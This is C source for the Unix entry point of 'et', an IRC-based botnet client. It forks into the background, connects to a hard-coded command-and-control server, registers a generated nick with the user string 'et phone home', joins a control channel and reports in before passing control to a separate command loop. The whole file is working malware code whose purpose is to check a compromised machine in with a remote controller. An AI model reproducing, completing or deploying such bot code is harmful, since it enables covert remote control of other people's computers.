/*	et_nix.c
	Author: William Woodruff
	------------------------
	The starting point for et on *nix systems.
	Forks, connects to the IRC C&C server, checks in, then calls et_main_loop_nix.
*/

#include "et_main_loop_nix.h"
#include "../gen_nick.h"
#include "../cnc_info.h"
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netdb.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <stdlib.h>

int main(int argc, char **argv[])
{
	pid_t child = fork();

	if (!child)
	{
		char nick[10];
		char nick_str[256];
		char user_str[256];
		char join_str[256];
		char mesg_str[256];

		int sock;
		struct sockaddr_in server;
		struct hostent *host;

		host = gethostbyname(IRC_SERVER);
		sock = socket(AF_INET, SOCK_STREAM, 0);

		memset(&server, 0, sizeof(struct sockaddr_in));
		server.sin_family = AF_INET;
		server.sin_addr.s_addr = *((unsigned long *) host->h_addr_list[0]);
		server.sin_port = htons(IRC_PORT);

		connect(sock, (struct sockaddr *) &server, sizeof(struct sockaddr_in));

		gen_nick(nick);
		snprintf(nick_str, 256, "NICK %s\r\n", nick);
		snprintf(user_str, 256, "USER %s 0 * :et phone home\r\n", nick);
		snprintf(join_str, 256, "JOIN :%s\r\n", IRC_CHANNEL);
		snprintf(mesg_str, 256, "PRIVMSG %s :%s %s\r\n", IRC_CHANNEL, nick, IRC_REPORT);
		char *quit = "QUIT";

		send(sock, nick_str, strlen(nick_str), 0);
		send(sock, user_str, strlen(user_str), 0);
		send(sock, join_str, strlen(join_str), 0);
		send(sock, mesg_str, strlen(mesg_str), 0);

		et_main_loop_nix(sock, nick);

		send(sock, quit, strlen(quit), 0);
		close(sock);

		exit(0);
	}

	exit(0);
}
